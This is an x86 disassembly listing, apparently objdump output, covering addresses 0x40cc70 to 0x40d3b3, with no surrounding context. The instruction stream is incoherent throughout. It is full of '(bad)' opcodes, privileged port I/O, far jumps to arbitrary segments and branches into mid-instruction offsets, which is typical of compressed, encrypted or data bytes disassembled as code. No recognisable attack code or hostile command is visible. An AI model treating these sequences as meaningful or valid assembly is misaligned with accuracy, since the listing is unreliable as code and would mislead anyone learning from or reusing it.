  40cc70:	and    edx,ebp
  40cc72:	daa    
  40cc73:	jl     0x40cc1f
  40cc75:	mov    bl,0x95
  40cc77:	mov    al,0x20
  40cc79:	pushf  
  40cc7a:	or     al,cl
  40cc7c:	mov    DWORD PTR [esi-0x18],ebx
  40cc7f:	not    esi
  40cc81:	scas   al,BYTE PTR es:[edi]
  40cc82:	dec    edi
  40cc83:	retf   0x92b0
  40cc86:	mov    dl,0x7f
  40cc88:	xchg   ebp,eax
  40cc89:	push   0x1d
  40cc8b:	je     0x40cc67
  40cc8d:	push   ss
  40cc8e:	imul   DWORD PTR [ecx-0x5fe25773]
  40cc94:	sbb    DWORD PTR [edx+0x63],esi
  40cc97:	stos   DWORD PTR es:[edi],eax
  40cc98:	mov    BYTE PTR [ebx],ch
  40cc9a:	sub    al,0x18
  40cc9c:	add    DWORD PTR [ecx-0x5f],0xffffffb2
  40cca0:	mov    dl,0x66
  40cca2:	cmp    ebp,DWORD PTR [ebp+0x2c]
  40cca5:	fucomip st,st(7)
  40cca7:	pop    ecx
  40cca8:	dec    esi
  40cca9:	pop    edx
  40ccaa:	jge    0x40ccca
  40ccac:	lods   al,BYTE PTR ds:[esi]
  40ccad:	push   ebp
  40ccae:	sub    edi,esi
  40ccb0:	cdq    
  40ccb1:	lods   al,BYTE PTR ds:[esi]
  40ccb2:	pop    ds
  40ccb3:	mov    ecx,ebp
  40ccb5:	add    esp,ebx
  40ccb7:	jnp    0x40cc96
  40ccb9:	xchg   edi,eax
  40ccba:	es cld 
  40ccbc:	mov    bl,0xcb
  40ccbe:	jo     0x40cc49
  40ccc0:	stos   BYTE PTR es:[edi],al
  40ccc1:	stos   DWORD PTR es:[edi],eax
  40ccc2:	and    al,0xfb
  40ccc4:	and    ah,BYTE PTR [esi]
  40ccc6:	mov    eax,ds:0x1f22f82c
  40cccb:	cmp    BYTE PTR [eax+0x68],dl
  40ccce:	adc    eax,0x12ca0768
  40ccd3:	test   eax,0x1ec83dfb
  40ccd8:	pushf  
  40ccd9:	inc    esi
  40ccda:	xor    al,0x9e
  40ccdc:	xlat   BYTE PTR ds:[ebx]
  40ccdd:	jg     0x40ccae
  40ccdf:	dec    edx
  40cce0:	dec    edx
  40cce1:	mov    dl,0x6
  40cce3:	xor    DWORD PTR [esi],ebp
  40cce5:	dec    ecx
  40cce6:	lods   eax,DWORD PTR ds:[esi]
  40cce7:	ret    
  40cce8:	test   BYTE PTR [eax-0x680ad08a],0xf6
  40ccef:	adc    esp,ebp
  40ccf1:	inc    eax
  40ccf2:	and    eax,0x4dd1a2aa
  40ccf7:	pop    edi
  40ccf8:	in     al,0xf8
  40ccfa:	test   eax,0x775535d0
  40ccff:	stos   DWORD PTR es:[edi],eax
  40cd00:	and    eax,0x5fc8741f
  40cd05:	test   al,0x94
  40cd07:	repnz mov edx,0x78432d01
  40cd0d:	sahf   
  40cd0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd0f:	sbb    al,0x7b
  40cd11:	lahf   
  40cd12:	mov    DWORD PTR [edx+ecx*1-0xaa4a489],esi
  40cd19:	mov    eax,ds:0x87a8c9b7
  40cd1e:	cmp    DWORD PTR [edi+0x68],eax
  40cd21:	sub    al,cl
  40cd23:	mov    esp,0x5550d84d
  40cd28:	cld    
  40cd29:	sub    BYTE PTR [ebx-0x6b],ch
  40cd2c:	stos   DWORD PTR es:[edi],eax
  40cd2d:	fisttp DWORD PTR [edi-0x3aa9d6f5]
  40cd33:	pop    es
  40cd34:	out    0x57,eax
  40cd36:	ret    
  40cd37:	shl    BYTE PTR [ecx+0x1f],cl
  40cd3a:	out    0xa,eax
  40cd3c:	push   esp
  40cd3d:	rcl    BYTE PTR [ebx],cl
  40cd3f:	adc    DWORD PTR [edx],eax
  40cd41:	dec    edi
  40cd42:	push   es
  40cd43:	or     BYTE PTR [ebx],ah
  40cd45:	(bad)  
  40cd46:	mov    ebx,0x48c10e1c
  40cd4b:	inc    esp
  40cd4c:	sub    bh,BYTE PTR [eax+edx*4+0xb744976]
  40cd53:	push   esp
  40cd54:	outs   dx,DWORD PTR ds:[esi]
  40cd55:	mov    edx,0xbf7004ec
  40cd5a:	(bad)  
  40cd5c:	adc    al,0x7a
  40cd5e:	cmp    esi,DWORD PTR [eax+0x1a8fef15]
  40cd64:	add    ah,BYTE PTR [edx+eiz*1-0x79]
  40cd68:	imul   ebx,DWORD PTR [ebp+0x637701db],0x64
  40cd6f:	test   al,0xf
  40cd71:	icebp  
  40cd72:	popa   
  40cd73:	ss shl cl,0xb7
  40cd77:	push   0x6e70441b
  40cd7c:	and    BYTE PTR [esi+0x36],bl
  40cd7f:	(bad)  
  40cd80:	cdq    
  40cd81:	cmp    al,0xfc
  40cd83:	inc    esp
  40cd84:	imul   esi,edx,0x12e22f9f
  40cd8a:	sub    ebp,DWORD PTR [esi-0x25]
  40cd8d:	jae    0x40cd4a
  40cd8f:	test   DWORD PTR [edx+0x6de2dac3],ebx
  40cd95:	data16 in al,0x34
  40cd98:	fidivr DWORD PTR [ebp+0x13]
  40cd9b:	xor    DWORD PTR [edi+0x2f],0xc168818a
  40cda2:	mov    eax,0x1f187f1c
  40cda7:	adc    ebx,DWORD PTR [esi]
  40cda9:	fist   WORD PTR [ecx+0x61]
  40cdac:	into   
  40cdad:	stc    
  40cdae:	inc    esi
  40cdaf:	mov    DWORD PTR [ebx-0x3c5f2ab7],esi
  40cdb5:	stos   DWORD PTR es:[edi],eax
  40cdb6:	sub    DWORD PTR ds:0xab8a064a,edx
  40cdbc:	xor    BYTE PTR [edi],bh
  40cdbe:	jne    0x40cd79
  40cdc0:	jl     0x40cdc4
  40cdc2:	out    dx,al
  40cdc3:	retf   
  40cdc4:	scas   al,BYTE PTR es:[edi]
  40cdc5:	fsubr  st,st(5)
  40cdc7:	scas   al,BYTE PTR es:[edi]
  40cdc8:	fidivr WORD PTR [ecx]
  40cdca:	mov    DWORD PTR [eax],0x6e4cf430
  40cdd0:	imul   DWORD PTR [eax]
  40cdd2:	jmp    0xb5c3:0xbaf56b4c
  40cdd9:	das    
  40cdda:	dec    ebp
  40cddb:	jl     0x40cddb
  40cddd:	push   es
  40cdde:	retf   0xa541
  40cde1:	data16 icebp 
  40cde3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cde4:	mov    ch,0x25
  40cde6:	fild   DWORD PTR [eax+0xf6bc594]
  40cdec:	out    0xe3,eax
  40cdee:	pop    ebp
  40cdef:	dec    ecx
  40cdf0:	jns    0x40ce01
  40cdf2:	in     al,0x1a
  40cdf4:	cwde   
  40cdf5:	mov    dl,0x7f
  40cdf7:	sti    
  40cdf8:	bound  ebp,QWORD PTR [ebx-0x6385aa59]
  40cdfe:	arpl   ax,cx
  40ce00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce01:	(bad)  
  40ce02:	sub    cl,bl
  40ce04:	daa    
  40ce05:	push   edi
  40ce06:	pop    ecx
  40ce07:	stos   DWORD PTR es:[edi],eax
  40ce08:	inc    edi
  40ce09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce0a:	push   ecx
  40ce0b:	jnp    0x40ce12
  40ce0d:	std    
  40ce0e:	mov    bl,bh
  40ce10:	and    al,0x41
  40ce12:	mov    cl,0xe2
  40ce15:	arpl   sp,bp
  40ce17:	sbb    ah,BYTE PTR [edi+0x790756a7]
  40ce1d:	pushf  
  40ce1e:	nop
  40ce1f:	push   es
  40ce20:	sbb    al,0xa3
  40ce22:	mov    dh,0x55
  40ce24:	rol    BYTE PTR [ecx],cl
  40ce26:	retf   
  40ce27:	out    dx,eax
  40ce28:	mov    eax,0xe2ee86d6
  40ce2d:	cld    
  40ce2e:	jmp    0x84b0:0xb0565343
  40ce35:	jge    0x40cea3
  40ce37:	and    esi,eax
  40ce39:	mov    ch,cl
  40ce3b:	sub    cl,bh
  40ce3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce3e:	shr    BYTE PTR ds:0x1b19ebcd,cl
  40ce44:	push   ebp
  40ce45:	xlat   BYTE PTR ds:[ebx]
  40ce46:	inc    ebp
  40ce47:	mov    ds:0x8f1f829d,al
  40ce4c:	inc    ecx
  40ce4d:	sub    ebx,ecx
  40ce4f:	xchg   ebx,ecx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	sbb    eax,0x2cd8c859
  40ce67:	mov    edi,DWORD PTR [esi+0x7e]
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	sar    BYTE PTR [edx+0x7219d8f8],cl
  40ce74:	pop    esp
  40ce75:	xchg   BYTE PTR [eax-0x77067737],bl
  40ce7b:	ins    BYTE PTR es:[edi],dx
  40ce7c:	pop    ds
  40ce7d:	pop    esi
  40ce7e:	and    eax,0x10994015
  40ce83:	xor    eax,0xb7d276cd
  40ce88:	pop    es
  40ce89:	out    0xae,eax
  40ce8b:	outs   dx,DWORD PTR ds:[esi]
  40ce8c:	mov    BYTE PTR ds:[edx-0x1c],bl
  40ce90:	loop   0x40ce66
  40ce92:	fld    TBYTE PTR [ecx]
  40ce94:	rcr    DWORD PTR [ebx-0x63364819],0x5b
  40ce9b:	jecxz  0x40ce9e
  40ce9d:	mov    cl,BYTE PTR [ecx+edx*4]
  40cea0:	push   ebx
  40cea1:	hlt    
  40cea2:	mov    dl,BYTE PTR ds:0x4d44bcb4
  40cea8:	dec    ebx
  40cea9:	mov    dl,0x9f
  40ceab:	jl     0x40ce44
  40cead:	and    eax,0x864fbc54
  40ceb2:	in     al,0x70
  40ceb4:	sub    bh,BYTE PTR [ebx]
  40ceb6:	inc    esp
  40ceb7:	std    
  40ceb8:	cdq    
  40ceb9:	mov    bh,0x7b
  40cebb:	mov    dl,0xdf
  40cebd:	cmp    esp,ecx
  40cebf:	(bad)  
  40cec0:	sar    bh,1
  40cec2:	lock push esi
  40cec4:	pop    esi
  40cec5:	sahf   
  40cec6:	pop    esp
  40cec7:	cmp    al,0xa5
  40cec9:	cmc    
  40ceca:	or     ebx,DWORD PTR [ecx-0x747a39af]
  40ced0:	push   0x47
  40ced2:	xor    ecx,DWORD PTR [eax]
  40ced4:	inc    ecx
  40ced5:	push   es
  40ced6:	mov    eax,ds:0xa6e0731a
  40cedb:	pop    es
  40cedc:	imul   ebp,edi,0x2a
  40cedf:	cdq    
  40cee0:	jno    0x40cf09
  40cee2:	aaa    
  40cee3:	into   
  40cee4:	retf   
  40cee5:	jnp    0x40cece
  40cee7:	jns    0x40ced4
  40cee9:	pusha  
  40ceea:	adc    eax,0x8feae598
  40ceef:	inc    edx
  40cef0:	imul   edi,DWORD PTR [edi],0xd67c4aaa
  40cef6:	add    BYTE PTR [edi],al
  40cef8:	lods   al,BYTE PTR ds:[esi]
  40cef9:	push   ebx
  40cefa:	arpl   si,ax
  40cefc:	(bad)  
  40cefd:	mov    esp,0xd00a160c
  40cf02:	push   esi
  40cf03:	ja     0x40cf81
  40cf05:	jmp    0x40cf10
  40cf07:	out    0xe3,eax
  40cf09:	loop   0x40cf7c
  40cf0b:	stos   BYTE PTR es:[edi],al
  40cf0c:	pop    ecx
  40cf0d:	jo     0x40ceea
  40cf0f:	pop    ds
  40cf10:	and    ch,BYTE PTR [esp+ecx*2+0x12cd367b]
  40cf17:	adc    BYTE PTR [eax-0x49d3fc34],0x6
  40cf1e:	mov    dh,0x55
  40cf20:	fnstsw WORD PTR [edi-0x4c]
  40cf23:	jns    0x40cf8b
  40cf25:	aam    0x61
  40cf27:	fbstp  TBYTE PTR [edx]
  40cf29:	stos   BYTE PTR es:[edi],al
  40cf2a:	inc    ebx
  40cf2b:	mov    ds:0x531c17ee,eax
  40cf30:	mov    esi,0xcf4cf7c9
  40cf35:	or     dh,BYTE PTR [edx]
  40cf37:	xchg   edi,eax
  40cf38:	xchg   esp,eax
  40cf39:	les    ebp,FWORD PTR [ebp+eax*8+0x36b9f47d]
  40cf40:	std    
  40cf41:	mov    BYTE PTR [eax+0x668a6bbf],0x19
  40cf48:	hlt    
  40cf49:	das    
  40cf4a:	in     eax,0x2b
  40cf4c:	jnp    0x40cf11
  40cf4e:	dec    esi
  40cf4f:	in     al,dx
  40cf50:	es jbe 0x40cf30
  40cf53:	loop   0x40cf08
  40cf55:	outs   dx,BYTE PTR ds:[esi]
  40cf56:	scas   eax,DWORD PTR es:[edi]
  40cf57:	cdq    
  40cf58:	(bad)  
  40cf59:	cmc    
  40cf5a:	inc    esp
  40cf5b:	sub    al,0x4f
  40cf5d:	dec    edi
  40cf5e:	sub    eax,0x5dc43099
  40cf63:	mov    al,ds:0xdb271c64
  40cf68:	aad    0xfe
  40cf6a:	in     eax,dx
  40cf6b:	loop   0x40cf85
  40cf6d:	fiadd  WORD PTR [ebp-0x52fcd79c]
  40cf73:	rcl    DWORD PTR [esi+0x17],0x43
  40cf77:	ficomp WORD PTR [edi+0x44fda3e9]
  40cf7d:	sbb    DWORD PTR [esi-0x64],edx
  40cf80:	adc    esi,edi
  40cf82:	adc    BYTE PTR [eax+0x6],bl
  40cf85:	in     al,dx
  40cf86:	fwait
  40cf87:	mov    eax,0x3019dd91
  40cf8c:	jns    0x40cf2e
  40cf8e:	cmp    al,0x3
  40cf90:	mov    edi,0x39fd35e5
  40cf95:	mov    DWORD PTR [esi+ecx*2-0x29],eax
  40cf99:	pop    ds
  40cf9a:	ror    BYTE PTR [esp+edx*1-0x56],cl
  40cf9e:	dec    esp
  40cf9f:	call   0x6f11:0xb9b4b919
  40cfa6:	xchg   esp,eax
  40cfa7:	push   edi
  40cfa8:	push   ebx
  40cfa9:	mov    esi,0xf7ae8307
  40cfae:	lods   eax,DWORD PTR ds:[esi]
  40cfaf:	cmp    edx,DWORD PTR [eax-0xe]
  40cfb2:	push   ss
  40cfb3:	ds jg  0x40cfac
  40cfb6:	rcl    ebp,cl
  40cfb8:	icebp  
  40cfb9:	shr    BYTE PTR [ecx+0x8],0x85
  40cfbd:	or     ch,bh
  40cfbf:	sbb    bl,bl
  40cfc1:	inc    ebx
  40cfc2:	xor    BYTE PTR ds:0x640704f4,0xb8
  40cfc9:	xor    DWORD PTR [ebp-0x6],esi
  40cfcc:	pop    ecx
  40cfcd:	in     al,dx
  40cfce:	push   0x3e
  40cfd0:	adc    eax,0x50bc5e77
  40cfd5:	sbb    edi,ecx
  40cfd7:	into   
  40cfd8:	lods   eax,DWORD PTR ds:[esi]
  40cfd9:	es or  al,0x6a
  40cfdc:	pop    esi
  40cfdd:	fwait
  40cfde:	pop    edi
  40cfdf:	jecxz  0x40d007
  40cfe1:	imul   ebp,DWORD PTR [esi+ebp*8-0x36],0x5f
  40cfe6:	inc    edx
  40cfe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfe8:	fwait
  40cfe9:	adc    BYTE PTR [edx],dl
  40cfeb:	and    DWORD PTR cs:[eax],ecx
  40cfee:	repz adc ebp,DWORD PTR es:[ebp-0x134af660]
  40cff6:	fsub   st,st(7)
  40cff8:	pop    es
  40cff9:	cdq    
  40cffa:	push   ecx
  40cffb:	push   edx
  40cffc:	cmp    ecx,DWORD PTR [esi+0x24dc5ed5]
  40d002:	xchg   ecx,eax
  40d003:	jmp    0x9d8:0x46d763b3
  40d00a:	test   al,0xe
  40d00c:	jl     0x40d02b
  40d00e:	jb     0x40d086
  40d010:	and    cl,BYTE PTR [ebp+0x6]
  40d013:	inc    ebx
  40d014:	into   
  40d015:	aaa    
  40d016:	test   DWORD PTR [ecx-0x126a56b8],ecx
  40d01c:	inc    ecx
  40d01d:	xchg   esi,eax
  40d01e:	mov    al,ds:0x1c65305b
  40d023:	or     eax,0x81871eba
  40d028:	leave  
  40d029:	das    
  40d02a:	out    dx,eax
  40d02b:	and    esp,DWORD PTR [esi]
  40d02d:	ret    0xe772
  40d030:	cld    
  40d031:	and    edx,edx
  40d033:	adc    BYTE PTR [ebx+0x54b07162],bl
  40d039:	je     0x40cfd6
  40d03b:	aaa    
  40d03c:	mov    esp,0x5bf7163a
  40d041:	test   dl,dl
  40d043:	fild   DWORD PTR [esi-0x3a9855ea]
  40d049:	mov    al,ds:0x30dc7b29
  40d04e:	inc    eax
  40d04f:	retf   
  40d050:	cdq    
  40d051:	xor    eax,0x6ca18ab1
  40d056:	push   ecx
  40d057:	pop    esp
  40d058:	retf   
  40d059:	out    0x7a,al
  40d05b:	xchg   ebx,eax
  40d05c:	mov    al,0x5e
  40d05e:	(bad)  
  40d05f:	sub    al,0x2b
  40d061:	xchg   esp,eax
  40d062:	and    eax,0x213dcdb7
  40d067:	mov    dh,0x7c
  40d069:	test   eax,0xac81e0e6
  40d06e:	push   esi
  40d06f:	sbb    al,0xa1
  40d071:	jo     0x40d0d5
  40d073:	sbb    BYTE PTR [ebx+ecx*4],ah
  40d076:	pop    ebx
  40d077:	in     al,dx
  40d078:	fs mov edi,0x19ccd205
  40d07e:	sti    
  40d07f:	cmp    esp,esi
  40d081:	repz les ebp,FWORD PTR [esi]
  40d084:	stos   BYTE PTR es:[edi],al
  40d085:	adc    al,0xd1
  40d087:	or     BYTE PTR [edi-0x70],dl
  40d08a:	push   ebx
  40d08b:	pushf  
  40d08c:	inc    esp
  40d08d:	sbb    ah,BYTE PTR ds:0xb925b7ff
  40d093:	mov    cl,BYTE PTR [esi+ecx*2+0x76980dbf]
  40d09a:	xchg   ebx,eax
  40d09b:	pushf  
  40d09c:	lds    ebx,FWORD PTR ds:0x52f11a58
  40d0a2:	(bad)  
  40d0a4:	and    al,0xe4
  40d0a6:	adc    eax,0x9400d9ad
  40d0ab:	sbb    al,0xeb
  40d0ad:	cs out dx,eax
  40d0af:	cmp    BYTE PTR [eax+0x55],ah
  40d0b2:	imul   ecx,eax,0x49
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	jnp    0x40d133
  40d0d1:	into   
  40d0d2:	push   ds
  40d0d3:	test   BYTE PTR [ecx+0x7c387e7e],0x7e
  40d0da:	jle    0x40d0e1
  40d0dc:	mov    edi,0xcc37744e
  40d0e1:	mov    ah,0x12
  40d0e3:	cmp    ebx,edi
  40d0e5:	mov    ds:0x286c17c4,al
  40d0ea:	sbb    ebp,DWORD PTR [edi+ecx*1+0x12]
  40d0ee:	pop    esp
  40d0ef:	call   0xc6dcc7c5
  40d0f4:	xchg   esi,edi
  40d0f6:	cmc    
  40d0f7:	sbb    ah,al
  40d0f9:	and    edx,eax
  40d0fb:	shr    ah,0xb1
  40d0fe:	repnz rcl BYTE PTR [ebp-0x49],cl
  40d102:	sbb    esp,esp
  40d104:	mov    dl,BYTE PTR gs:[ecx-0x5c]
  40d108:	jmp    0x8b48:0xa1148e1f
  40d10f:	push   es
  40d110:	in     eax,dx
  40d111:	sbb    eax,0x1df7f456
  40d116:	add    ebp,ecx
  40d118:	xchg   edx,eax
  40d119:	loope  0x40d171
  40d11b:	push   edx
  40d11c:	fidivr WORD PTR [eax-0x79]
  40d11f:	retf   0x19fc
  40d122:	je     0x40d144
  40d124:	shl    BYTE PTR [edi+edi*1],cl
  40d127:	ror    DWORD PTR [edi+ecx*1+0x2e],0xdf
  40d12c:	xlat   BYTE PTR ds:[ebx]
  40d12d:	call   0x634396b1
  40d132:	push   ebp
  40d133:	sahf   
  40d134:	in     eax,0xae
  40d136:	ins    DWORD PTR es:[edi],dx
  40d137:	test   al,0xb0
  40d139:	pop    edx
  40d13a:	sbb    ecx,DWORD PTR [edx+0x3]
  40d13d:	dec    ebp
  40d13e:	mov    bl,0x6a
  40d140:	lds    eax,FWORD PTR [esi]
  40d142:	stos   BYTE PTR es:[edi],al
  40d143:	jno    0x40d163
  40d145:	pop    ebx
  40d146:	jge    0x40d124
  40d148:	outs   dx,DWORD PTR ds:[esi]
  40d149:	shr    esp,1
  40d14b:	push   0xeed4e119
  40d150:	and    eax,0x7a0c809b
  40d155:	call   0x963daca9
  40d15a:	aas    
  40d15b:	dec    ebx
  40d15c:	or     BYTE PTR [edi+eax*4+0x5e],dh
  40d160:	mov    al,dh
  40d162:	mov    ah,0x5f
  40d164:	dec    al
  40d166:	inc    esp
  40d167:	push   ebp
  40d168:	mov    dh,0x84
  40d16a:	or     DWORD PTR [edi],esi
  40d16c:	xor    BYTE PTR [eax],ah
  40d16e:	popf   
  40d16f:	sahf   
  40d170:	(bad)  
  40d171:	in     al,dx
  40d172:	mov    ebx,0x8a9fb43c
  40d177:	sub    eax,0x2a651dc1
  40d17c:	loop   0x40d1b9
  40d17e:	and    esi,esi
  40d180:	mov    ah,0x61
  40d182:	ins    DWORD PTR es:[edi],dx
  40d183:	and    eax,0x4ffab004
  40d188:	les    edx,FWORD PTR [ecx+0x63]
  40d18b:	retf   
  40d18c:	adc    edi,eax
  40d18e:	ror    DWORD PTR [ebx],1
  40d190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d191:	in     eax,0x83
  40d193:	or     eax,0x31cb53e6
  40d198:	push   ebx
  40d199:	sti    
  40d19a:	add    eax,0xa8fe6498
  40d19f:	and    dl,ah
  40d1a1:	mov    al,ds:0x970333e4
  40d1a6:	in     al,0x6d
  40d1a8:	xlat   BYTE PTR ds:[ebx]
  40d1a9:	(bad)  
  40d1aa:	mov    esp,0x75c6befb
  40d1af:	mov    eax,0x78ab5fad
  40d1b4:	dec    esi
  40d1b5:	loope  0x40d160
  40d1b7:	sahf   
  40d1b8:	add    dl,BYTE PTR [edi-0x1a]
  40d1bb:	xor    ch,ah
  40d1bd:	stc    
  40d1be:	cld    
  40d1bf:	daa    
  40d1c0:	mov    ecx,?
  40d1c2:	dec    edi
  40d1c3:	pop    ss
  40d1c4:	sbb    BYTE PTR [esi],bh
  40d1c6:	push   edx
  40d1c7:	add    eax,0xcff23507
  40d1cc:	jns    0x40d1ff
  40d1ce:	adc    bl,dh
  40d1d0:	das    
  40d1d1:	mov    cl,0x87
  40d1d3:	popf   
  40d1d4:	adc    cl,BYTE PTR [ecx-0x502ddc3b]
  40d1da:	arpl   WORD PTR [eax-0xf],bx
  40d1dd:	jae    0x40d1a7
  40d1df:	mov    DWORD PTR [edx+0x29],eax
  40d1e2:	jmp    0x40d223
  40d1e4:	jnp    0x40d1e1
  40d1e6:	dec    esp
  40d1e7:	mov    dl,0xbe
  40d1e9:	pop    edi
  40d1ea:	aas    
  40d1eb:	stos   BYTE PTR es:[edi],al
  40d1ec:	and    al,0xb5
  40d1ee:	and    DWORD PTR [ebp-0x36],0xae32caed
  40d1f5:	pop    ebp
  40d1f6:	push   es
  40d1f7:	or     ch,dl
  40d1f9:	inc    ebp
  40d1fa:	cmp    ch,BYTE PTR [edx+0xd]
  40d1fd:	daa    
  40d1fe:	fsubr  QWORD PTR [edx+0x11]
  40d201:	mov    edx,0xbc678f9f
  40d206:	ja     0x40d1ee
  40d208:	inc    ecx
  40d209:	mov    esp,edx
  40d20b:	xlat   BYTE PTR ds:[ebx]
  40d20c:	push   ebx
  40d20d:	mov    edx,0x5ab178a4
  40d212:	sbb    bl,dl
  40d214:	ss inc edx
  40d216:	aaa    
  40d217:	cmp    cl,BYTE PTR [edx+0x64b30620]
  40d21d:	mov    al,ds:0x81e4d627
  40d222:	xor    cl,BYTE PTR ds:0x25db0601
  40d228:	mov    ebx,fs
  40d22a:	dec    edi
  40d22b:	or     eax,0xd5afdd11
  40d230:	retf   0x87e0
  40d233:	add    BYTE PTR [edx-0x23dcece0],bl
  40d239:	cs dec ebp
  40d23b:	push   esi
  40d23c:	js     0x40d21b
  40d23e:	and    DWORD PTR [esi-0x7bc55630],eax
  40d244:	ficom  WORD PTR [ebp+0x37fbed97]
  40d24a:	sbb    eax,0xb15b288c
  40d24f:	or     al,0x76
  40d251:	nop
  40d252:	ss mov esi,0x244f3a30
  40d258:	out    0xb9,eax
  40d25a:	lock mov DWORD PTR [ebp-0x1c],ebx
  40d25e:	les    ebp,FWORD PTR [edx-0xb20127e]
  40d264:	xchg   esi,eax
  40d265:	pushfw 
  40d267:	and    ebp,edx
  40d269:	adc    edx,DWORD PTR [eax]
  40d26b:	test   BYTE PTR [esi+0x16],dh
  40d26e:	dec    esp
  40d26f:	mov    ebx,0x690373f6
  40d274:	jmp    0x40d29e
  40d276:	mov    esp,0x8279a9d6
  40d27b:	lods   eax,DWORD PTR ds:[esi]
  40d27c:	push   ebx
  40d27d:	inc    ebp
  40d27e:	mov    ds:0x5219fd07,al
  40d283:	mov    WORD PTR [esp+ebx*4],ss
  40d286:	add    eax,0xb3922188
  40d28b:	ja     0x40d2cd
  40d28d:	retf   
  40d28e:	dec    edi
  40d28f:	or     edx,eax
  40d291:	lea    ecx,[ebp*4+0x78d7f105]
  40d298:	test   BYTE PTR [esi-0x63],dh
  40d29b:	pop    ss
  40d29c:	test   eax,0x9b4d6011
  40d2a1:	xchg   ecx,eax
  40d2a2:	in     al,dx
  40d2a3:	jno    0x40d2a3
  40d2a5:	aam    0x68
  40d2a7:	retf   0x1ff2
  40d2aa:	out    dx,al
  40d2ab:	mov    al,0x1b
  40d2ad:	leave  
  40d2ae:	fwait
  40d2af:	stos   DWORD PTR es:[edi],eax
  40d2b0:	imul   bl
  40d2b2:	mov    DWORD PTR [ebx],esi
  40d2b4:	cli    
  40d2b5:	fs xchg ecx,ebx
  40d2b8:	lea    edx,[ecx-0x66]
  40d2bb:	in     al,0x94
  40d2bd:	or     BYTE PTR [edx+0x6b],dh
  40d2c0:	push   ebx
  40d2c1:	push   ecx
  40d2c2:	ja     0x40d2e0
  40d2c4:	mov    edi,0x319cc944
  40d2c9:	push   0xffffffc6
  40d2cb:	mov    edi,0xae7e3fd3
  40d2d0:	fptan  
  40d2d2:	ins    DWORD PTR es:[edi],dx
  40d2d3:	adc    ah,BYTE PTR [eax+0x60]
  40d2d6:	sbb    al,0x35
  40d2d8:	lods   al,BYTE PTR ds:[esi]
  40d2d9:	sub    eax,0x540a198e
  40d2de:	jecxz  0x40d2e6
  40d2e0:	pop    ss
  40d2e1:	fsub   QWORD PTR [ebx-0xa]
  40d2e4:	aam    0xed
  40d2e6:	sbb    al,0xbd
  40d2e8:	js     0x40d345
  40d2ea:	int    0xa0
  40d2ec:	not    DWORD PTR [edi+eax*8-0x12]
  40d2f0:	sbb    ecx,DWORD PTR ds:0x2704096d
  40d2f6:	mov    al,0x6e
  40d2f8:	lea    edi,[ebp-0x45b2a3c4]
  40d2fe:	jle    0x40d281
  40d300:	ror    BYTE PTR [ebp+0x65d147e6],0x6d
  40d307:	mov    cl,0x11
  40d309:	(bad)  
  40d30a:	call   0x7f21a7e7
  40d30f:	sahf   
  40d310:	fadd   QWORD PTR [esi]
  40d312:	inc    edi
  40d313:	ficomp WORD PTR [ebx+eax*2]
  40d316:	push   cs
  40d317:	push   ss
  40d318:	cli    
  40d319:	push   esp
  40d31a:	ss cmp ch,al
  40d31d:	js     0x40d328
  40d31f:	or     al,0xf0
  40d321:	push   eax
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	call   0xb1331e45
  40d33d:	xchg   edi,eax
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	cmc    
  40d345:	ret    0xe460
  40d348:	push   ecx
  40d349:	mov    ds:0xfed07dc4,eax
  40d34e:	scas   eax,DWORD PTR es:[edi]
  40d34f:	xor    ch,BYTE PTR [edx-0x4f42ff9e]
  40d355:	out    dx,al
  40d356:	jae    0x40d34c
  40d358:	adc    al,0xaa
  40d35a:	or     edi,eax
  40d35c:	or     esp,DWORD PTR [esi+0x623080fa]
  40d362:	xchg   esi,eax
  40d363:	iret   
  40d364:	test   al,0x5d
  40d366:	and    ch,bl
  40d368:	mov    bh,0x4b
  40d36a:	mov    ebp,0x557f79a3
  40d36f:	add    DWORD PTR ds:[ebx],0x121c4b85
  40d376:	adc    DWORD PTR [edi],ebp
  40d378:	pop    edi
  40d379:	mov    ch,0x7e
  40d37b:	pusha  
  40d37c:	mov    ds:0x69bdc211,eax
  40d381:	ror    DWORD PTR [ecx+0x78],cl
  40d384:	ret    
  40d385:	cld    
  40d386:	test   bh,dl
  40d388:	in     eax,dx
  40d389:	pop    ss
  40d38a:	cdq    
  40d38b:	jg     0x40d354
  40d38d:	fiadd  DWORD PTR [ebp-0x8fc01cd]
  40d393:	xlat   BYTE PTR ds:[ebx]
  40d394:	add    al,BYTE PTR [ecx]
  40d396:	push   ebx
  40d397:	xchg   edi,eax
  40d398:	xor    ebp,ebp
  40d39a:	pop    edx
  40d39b:	test   ebp,eax
  40d39d:	std    
  40d39e:	or     al,0x74
  40d3a0:	sbb    ecx,ecx
  40d3a2:	mov    ecx,0xffbf3e6b
  40d3a7:	adc    ebx,DWORD PTR [eax]
  40d3a9:	adc    esi,DWORD PTR [edx-0x18]
  40d3ac:	inc    esi
  40d3ad:	jmp    0x40d34b
  40d3af:	in     al,dx
  40d3b0:	mov    esp,DWORD PTR [esi-0x2f]
  40d3b3:	out    dx,al
